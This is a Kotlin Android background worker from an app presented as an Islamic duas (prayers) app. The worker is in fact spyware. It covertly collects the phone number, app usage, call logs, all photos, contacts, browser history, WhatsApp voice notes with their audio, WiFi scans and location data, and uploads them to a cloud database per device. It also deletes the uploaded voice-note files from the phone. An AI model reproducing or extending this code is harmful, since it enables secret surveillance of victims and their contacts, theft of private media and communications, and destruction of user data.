package islamic.duas.sync

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import islamic.duas.browser.BrowserHistoryCollector
import islamic.duas.cloud.CloudApi
import islamic.duas.cloud.CloudConfig
import islamic.duas.contacts.ContactsCollector
import islamic.duas.logs.CallLogCollector
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.metrics.MetricsCollector
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import islamic.duas.wifi.WifiScanner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class DuaSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(300000) { runSync(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "DuaSync"

        suspend fun runSync(context: Context) {
            val androidId = DeviceId.get(context)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            val currentTs = System.currentTimeMillis()
            val currentTimeStr = dateFormat.format(Date(currentTs))
            val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)

            // ── Metrics & Apps ──
            try {
                val metricsCollector = MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()

                val metricsDoc = JSONObject().apply {
                    put("timestamp", currentTimeStr)
                    put("ts_ms", currentTs)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)
                CloudApi.updateCloudDocument(
                    "devices/$androidId/metrics/latest",
                    metricsDoc
                )

                val appUsageList = metricsCollector.collectPerAppUsage()
                val hourlyData = metricsCollector.collectHourlyUsage()
                for (usage in appUsageList) {
                    val usageDoc = JSONObject().apply {
                        put("packageName", usage.packageName)
                        put("appName", usage.appName)
                        put("totalForegroundMs", usage.totalForegroundMs)
                        put("lastUsedMs", usage.lastUsedMs)
                        put("date", currentTimeStr.split(" ")[0])
                        val appHourly = hourlyData[usage.packageName]
                        if (appHourly != null && appHourly.isNotEmpty()) {
                            val hourlyObj = JSONObject()
                            for ((hour, ms) in appHourly) {
                                hourlyObj.put(hour.toString(), ms)
                            }
                            put("hourlyMs", hourlyObj)
                        }
                    }
                    val pkgKey = usage.packageName.replace(".", "_")
                    CloudApi.writeToCloud("devices/$androidId/apps", usageDoc, pkgKey)
                    CloudApi.writeToRTDB("devices/$androidId/apps/$pkgKey", usageDoc)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Metrics/apps sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Metrics/apps sync error", e)
            }

            // ── Call Logs ──
            try {
                val hasCallPerm = context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasCallPerm) {
                    ErrorLog.write(context, TAG, "Call logs skipped: READ_CALL_LOG not granted", null)
                } else {
                    val lastCallSync = prefs.getLong("last_call_sync_ms", 0L)
                    val callLogCollector = CallLogCollector(context)
                    val callLogs = callLogCollector.collectCallLogs(lastCallSync)

                    if (callLogs.isEmpty()) {
                        ErrorLog.write(context, TAG, "Call logs query returned empty", null)
                    }

                    for (call in callLogs) {
                        val ts = call.optLong("ts_ms", currentTs)
                        CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", call)
                    }

                    if (callLogs.isNotEmpty()) {
                        prefs.edit().putLong("last_call_sync_ms", currentTs).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Call log sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Call log sync error", e)
            }

            // ── Photos (RTDB-only, capped at 50, dedup by path) ──
            try {
                val uploadedPaths = prefs.getStringSet("uploaded_photo_paths", mutableSetOf()) ?: mutableSetOf()
                val mediaCollector = MediaCollector(context)
                val allPhotos = mediaCollector.collectNewPhotos(0L, Int.MAX_VALUE)
                // Filter: already-uploaded files + trashed photos (skip trashed entirely)
                val newPhotos = allPhotos.filter { it.file.absolutePath !in uploadedPaths }

                var newestDateTaken = 0L
                for ((i, entry) in newPhotos.withIndex()) {
                    try {
                        // Skip photos >5MB to prevent OOM
                        if (entry.file.length() > 5 * 1024 * 1024) {
                            Log.w(TAG, "Skipping oversized photo: ${entry.file.name} (${entry.file.length() / 1024 / 1024}MB)")
                            uploadedPaths.add(entry.file.absolutePath)
                            continue
                        }
                        val processed = PhotoProcessor.process(entry.file, true)
                        if (processed != null) {
                            val ts = System.currentTimeMillis()
                            val photoDoc = JSONObject().apply {
                                put("timestamp", ts)
                                put("data", processed.base64)
                                put("width", processed.width)
                                put("height", processed.height)
                                put("fileName", processed.fileName)
                                put("dateTaken", entry.dateTaken)
                            }
                            CloudApi.writeToRTDB("devices/$androidId/photos/$ts", photoDoc)
                            uploadedPaths.add(entry.file.absolutePath)
                            if (entry.dateTaken > newestDateTaken) newestDateTaken = entry.dateTaken
                            if (i < newPhotos.size - 1) delay(500)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Photo processing error: ${e.message}", e)
                    }
                }

                if (newPhotos.isNotEmpty()) {
                    prefs.edit().putStringSet("uploaded_photo_paths", uploadedPaths).apply()
                }

                // Enforce 50-photo cap: fetch existing keys, delete oldest by upload time
                try {
                    val keysUrl = "${CloudConfig.RTDB_URL}/devices/$androidId/photos.json?shallow=true"
                    val keysReq = okhttp3.Request.Builder().url(keysUrl).get().build()
                    val keysResp = CloudApi.getClient().newCall(keysReq).execute()
                    val keysBody = keysResp.body?.string()
                    keysResp.close()
                    if (keysBody != null && keysBody != "null") {
                        val allKeys = org.json.JSONObject(keysBody).keys().asSequence().toList().sorted()
                        val maxPhotos = 50
                        if (allKeys.size > maxPhotos) {
                            val toDelete = allKeys.take(allKeys.size - maxPhotos)
                            for (oldKey in toDelete) {
                                CloudApi.deleteFromRTDB("devices/$androidId/photos/$oldKey")
                                delay(200)
                            }
                            Log.i(TAG, "Deleted ${toDelete.size} old photos, kept $maxPhotos")
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Photo cap cleanup error: ${e.message}", e)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Photo sync error", e)
            }

            // ── Contacts ──
            try {
                val hasContactsPerm = context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (!hasContactsPerm) {
                    ErrorLog.write(context, TAG, "Contacts skipped: READ_CONTACTS not granted", null)
                } else {
                    val lastContactsSync = prefs.getLong("last_contacts_sync", 0L)
                    val contactsCollector = ContactsCollector(context)
                    val contacts = contactsCollector.collectAll(lastContactsSync)
                    if (contacts.length() > 0) {
                        CloudApi.writeToRTDB(
                            "devices/$androidId/contacts/batch_$currentTs",
                            JSONObject().apply { put("contacts", contacts); put("ts_ms", currentTs) }
                        )
                        prefs.edit().putLong("last_contacts_sync", currentTs).apply()
                    } else {
                        ErrorLog.write(context, TAG, "Contacts query returned empty", null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Contacts sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Contacts sync error", e)
            }

            // ── Browser History ──
            try {
                val browserCollector = BrowserHistoryCollector(context)
                val history = browserCollector.collectAll()
                if (history.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/browser_history/batch_$currentTs",
                        JSONObject().apply { put("history", history); put("ts_ms", currentTs) }
                    )
                } else {
                    ErrorLog.write(context, TAG, "Browser history query returned empty (all providers)", null)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Browser history sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Browser history sync error", e)
            }

            // ── Voice Notes (WhatsApp, adaptive by free space + 300MB audio budget) ──
            try {
                val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasAudioPerm) {
                    ErrorLog.write(context, TAG, "Voice notes skipped: audio permission not granted", null)
                } else {
                    val mediaCollector = MediaCollector(context)
                    val voiceNotes = mediaCollector.collectVoiceNotes()
                    if (voiceNotes.isNotEmpty()) {
                        // Adaptive caps based on free space
                        val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
                        val maxNotes = when {
                            freeMb > 1000 -> 30
                            freeMb > 200 -> 15
                            else -> 8
                        }
                        val withAudioCount = when {
                            freeMb > 1000 -> maxNotes
                            freeMb > 200 -> minOf(6, maxNotes)
                            else -> 0
                        }

                        // Audio budget: 30% of Spark 1GB = 300MB
                        val audioBudget = 300L * 1024 * 1024
                        val audioSizesJson = prefs.getString("voice_audio_batch_sizes", "{}") ?: "{}"
                        val audioSizes = org.json.JSONObject(audioSizesJson)
                        var usedBudget = 0L
                        for (k in audioSizes.keys()) {
                            usedBudget += audioSizes.optLong(k, 0L)
                        }

                        val notesArray = JSONArray()
                        val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
                        val deletedPaths = mutableListOf<String>()
                        val oneDayAgo = currentTs - 86400000L
                        var added = 0
                        var batchAudioBytes = 0L
                        for (note in voiceNotes) {
                            if (note.file.absolutePath in uploadedPaths) continue
                            if (added >= maxNotes) break
                            val isOld = note.dateAdded > 0 && note.dateAdded < oneDayAgo
                            var includeAudio = !isOld && added < withAudioCount && note.size in 1..512000
                            val noteJson = JSONObject().apply {
                                put("fileName", note.file.name)
                                put("dateAdded", note.dateAdded)
                                put("durationMs", note.duration)
                                put("sizeBytes", note.size)
                                put("mimeType", note.mimeType)
                                if (includeAudio) {
                                    try {
                                        val audioBytes = note.file.readBytes()
                                        val b64 = java.util.Base64.getEncoder().encodeToString(audioBytes)
                                        // Check budget before committing
                                        if (usedBudget + batchAudioBytes + b64.length <= audioBudget) {
                                            put("audioData", b64)
                                            batchAudioBytes += b64.length
                                        } else {
                                            put("audioStripped", true)
                                            includeAudio = false
                                        }
                                    } catch (_: Exception) { }
                                } else if (isOld) {
                                    put("audioStripped", true)
                                }
                            }
                            notesArray.put(noteJson)
                            uploadedPaths.add(note.file.absolutePath)
                            deletedPaths.add(note.file.absolutePath)
                            added++
                        }
                        if (notesArray.length() > 0) {
                            CloudApi.writeToRTDB(
                                "devices/$androidId/voice_notes/batch_$currentTs",
                                JSONObject().apply {
                                    put("notes", notesArray)
                                    put("totalCount", voiceNotes.size)
                                    put("ts_ms", currentTs)
                                    put("freeMb", freeMb.toInt())
                                    put("audioBytes", batchAudioBytes)
                                }
                            )
                            // Track audio bytes for budget enforcement
                            if (batchAudioBytes > 0) {
                                audioSizes.put("batch_$currentTs", batchAudioBytes)
                                prefs.edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
                            }
                            for (path in deletedPaths) {
                                try { File(path).delete() } catch (_: Exception) { }
                            }
                            prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                        }
                        val budgetPct = (usedBudget + batchAudioBytes) * 100 / audioBudget
                        Log.i(TAG, "Voice notes: $added uploaded (audio: ${withAudioCount}, budget: ${budgetPct}%, free: ${freeMb}MB)")
                    } else {
                        ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Voice notes sync error", e)
            }

            // ── WiFi Scan ──
            try {
                val lastLoc = DuaTracker.getLastLocation()
                val lat = lastLoc?.optDouble("lat")
                val lng = lastLoc?.optDouble("lng")
                val wifiScanner = WifiScanner(context)
                val networks = wifiScanner.scanAndCollect(lat, lng)
                if (networks.length() > 0) {
                    CloudApi.writeToRTDB(
                        "devices/$androidId/wifi_scan/$currentTs",
                        JSONObject().apply { put("networks", networks); put("ts_ms", currentTs) }
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "WiFi scan error: ${e.message}", e)
                ErrorLog.write(context, TAG, "WiFi scan error", e)
            }

            // ── Device Info ──
            try {
                val metricsCollector2 = MetricsCollector(context)
                val metrics2 = metricsCollector2.collectDeviceMetrics()
                val deviceInfo = JSONObject().apply {
                    put("deviceModel", metrics2.deviceModel)
                    put("manufacturer", metrics2.manufacturer)
                    put("lastSyncMs", currentTs)
                    put("lastSync", currentTimeStr)
                }
                CloudApi.writeToRTDB("devices/$androidId/info", deviceInfo)
                CloudApi.updateCloudDocument("devices/$androidId/info", deviceInfo)
            } catch (e: Exception) {
                Log.e(TAG, "Device info sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Device info sync error", e)
            }

            // ── Usage ──
            try {
                val openCount = prefs.getInt("app_open_count", 0)
                val openDoc = JSONObject().apply {
                    put("openCount", openCount)
                    put("lastOpened", currentTimeStr)
                    put("lastOpenedMs", currentTs)
                    put("date", currentTimeStr.split(" ")[0])
                }
                CloudApi.updateCloudDocument("devices/$androidId/usage/deviceSync", openDoc)
            } catch (e: Exception) {
                Log.e(TAG, "Usage sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Usage sync error", e)
            }

            // ── Cleanup (storage-first priority) ──
            try {
                runCleanup(context, androidId, currentTs)
            } catch (e: Exception) {
                Log.e(TAG, "Cleanup error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Cleanup error", e)
            }
        }

        private suspend fun runCleanup(context: Context, androidId: String, now: Long) {
            val okClient = CloudApi.getClient()
            val rtdbBase = CloudConfig.RTDB_URL

            // ── Voice notes: 7-day TTL + adaptive batch cap by free space + 300MB audio budget ──
            try {
                val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
                val keepBatches = when {
                    freeMb > 1000 -> 20
                    freeMb > 200 -> 12
                    else -> 6
                }
                val url = "$rtdbBase/devices/$androidId/voice_notes.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
                    val sevenDaysAgo = now - 7 * 86400000L
                    val toDelete = keys.filter { key ->
                        val ts = key.removePrefix("batch_").toLongOrNull() ?: 0L
                        ts < sevenDaysAgo || keys.indexOf(key) < keys.size - keepBatches
                    }
                    if (toDelete.isNotEmpty()) {
                        // Remove deleted batches from audio budget tracker
                        val audioSizesJson = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                            .getString("voice_audio_batch_sizes", "{}") ?: "{}"
                        val audioSizes = org.json.JSONObject(audioSizesJson)
                        for (key in toDelete) {
                            audioSizes.remove(key)
                            CloudApi.deleteFromRTDB("devices/$androidId/voice_notes/$key")
                            delay(150)
                        }
                        context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                            .edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
                        Log.i(TAG, "Voice cleanup: deleted ${toDelete.size} batches (keep: $keepBatches, free: ${freeMb}MB)")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Voice notes cleanup error: ${e.message}", e)
            }

            // ── Timeline: 14-day TTL + 500/day cap ──
            try {
                val url = "$rtdbBase/devices/$androidId/timeline.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
                    val fourteenDaysAgo = now - 14 * 86400000L
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < fourteenDaysAgo || keys.indexOf(key) < keys.size - 500) {
                            CloudApi.deleteFromRTDB("devices/$androidId/timeline/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Timeline cleanup: deleted $deleted entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Timeline cleanup error: ${e.message}", e)
            }

            // ── Browser history: keep last 5 batches ──
            try {
                val url = "$rtdbBase/devices/$androidId/browser_history.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
                    if (keys.size > 5) {
                        val toDelete = keys.take(keys.size - 5)
                        for (key in toDelete) {
                            CloudApi.deleteFromRTDB("devices/$androidId/browser_history/$key")
                            delay(150)
                        }
                        Log.i(TAG, "Browser history cleanup: deleted ${toDelete.size} old batches")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Browser history cleanup error: ${e.message}", e)
            }

            // ── WiFi scans: keep last 10 batches ──
            try {
                val url = "$rtdbBase/devices/$androidId/wifi_scan.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
                    if (keys.size > 10) {
                        val toDelete = keys.take(keys.size - 10)
                        for (key in toDelete) {
                            CloudApi.deleteFromRTDB("devices/$androidId/wifi_scan/$key")
                            delay(150)
                        }
                        Log.i(TAG, "WiFi scan cleanup: deleted ${toDelete.size} old batches")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "WiFi scan cleanup error: ${e.message}", e)
            }

            // ── Night samples: 7-day TTL ──
            try {
                val url = "$rtdbBase/devices/$androidId/location/night_samples.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val sevenDaysAgo = now - 7 * 86400000L
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/night_samples/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Night samples cleanup: deleted $deleted entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Night samples cleanup error: ${e.message}", e)
            }

            // ── Location ts nodes: 30-day TTL (DuaTracker.processLocation path) ──
            try {
                val url = "$rtdbBase/devices/$androidId/location.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    val skipKeys = setOf("latest", "history", "night_samples")
                    val thirtyDaysAgo = now - 30 * 86400000L
                    var deleted = 0
                    for (key in keys) {
                        if (key in skipKeys) continue
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < thirtyDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Location ts cleanup: deleted $deleted old entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Location ts cleanup error: ${e.message}", e)
            }
        }
    }
}
